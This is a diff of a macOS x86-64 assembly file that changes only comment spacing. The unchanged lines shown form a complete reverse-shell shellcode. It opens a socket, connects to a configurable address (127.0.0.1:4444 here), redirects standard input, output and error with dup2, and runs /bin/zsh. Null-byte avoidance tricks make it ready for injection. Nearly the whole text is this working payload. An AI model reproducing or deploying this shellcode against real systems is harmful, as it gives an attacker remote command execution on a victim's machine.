@@ -12,7 +12,7 @@ _main:
 	pop rdi						; RDI = AF_INET = 2
 	push 0x1
 	pop rsi						; RSI = SOCK_STREAM = 1
-	xor rdx, rdx				; RDX = IPPROTO_IP = 0
+	xor rdx, rdx					; RDX = IPPROTO_IP = 0
 
 	; execute socket syscall (#97)
 
@@ -20,7 +20,7 @@ _main:
 	pop rax
 	bts rax, 25					; set 25th bit to 1 -> avoid null bytes
 	syscall 					; execute socket
-	mov r9, rax 				; store the returned file descriptor in r9
+	mov r9, rax 					; store the returned file descriptor in r9
 
 	; connect syscall
 	; ----------------------------------------------------
@@ -31,7 +31,7 @@ _main:
 
 	; Build the structure - Set IP & Port Here!
 
-	xor rsi, rsi 				; zero out RSI
+	xor rsi, rsi 					; zero out RSI
 	mov rsi, 0x0100007f5c110200 ; IP = 127.0.0.1 (7f000001), Port = 4444 (115c), AF_INET = 02, Len = 00
 
 	; In the above instruction we will have null bytes, although theres a few things we can do
@@ -51,7 +51,7 @@ _main:
 
 	push 0x62 					; put 98 on the stack
 	pop rax 					; pop to the RAX
-	bts rax, 25 				; set 25th bit to 1 -> avoid null bytes
+	bts rax, 25 					; set 25th bit to 1 -> avoid null bytes
 	syscall 					; execute connect
 	
 	; dup2 function call
@@ -60,7 +60,7 @@ _main:
 	; fildes = existing file descriptor, fildes2 = STD IN/OUT/ERR 
 	; -----------------------------------------------------------
 
-	mov rdi, r9 				; put the file descriptor previously stored in r9 into RDI
+	mov rdi, r9 					; put the file descriptor previously stored in r9 into RDI
 	push 2
 	pop rsi 					; set RSI to 2
 	
@@ -69,28 +69,28 @@ _main:
 	dup2_loop:
 	push 0x5a 					; put 90 on the stack (dup2)
 	pop rax 					; pop to RAX
-	bts rax, 25 				; set 25th bit to 1 -> avoid null bytes
+	bts rax, 25 					; set 25th bit to 1 -> avoid null bytes
 	syscall 					; execute dup2
 	dec rsi 					; decrement RSI
-	jns dup2_loop 				; repeat the loop if RSI >= 0
+	jns dup2_loop 					; repeat the loop if RSI >= 0
 
 	; execve syscall
 	; --------------------------------------------------
 	; int execve(char *fname, char **argp, char **envp);
 	; --------------------------------------------------
 	
-	xor rdx, rdx  				; zero RDX
+	xor rdx, rdx  					; zero RDX
 	push rdx 					; NULL string terminator
-	mov rbx, '/bin/zsh' 		; push string into RBX (/bin/zsh is default on mac)
+	mov rbx, '/bin/zsh' 				; push string into RBX (/bin/zsh is default on mac)
 	push rbx 					; push string to the stack
-	mov rdi, rsp 				; store the stack pointer in RDI
+	mov rdi, rsp 					; store the stack pointer in RDI
 	push rdx 					; argv[1] = 0
 	push rdi 					; argv[0] = /bin/zsh
-	mov rsi, rsp 				; store RSP in RSI
+	mov rsi, rsp 					; store RSP in RSI
 
 	; execute execve syscall (#59)
 
 	push 59 					; put 59 on the stack
 	pop rax 					; pop it
-	bts rax, 25 				; set 25th bit in RAX to 1 -> avoid null bytes
+	bts rax, 25 					; set 25th bit in RAX to 1 -> avoid null bytes
 	syscall 					; execute execve
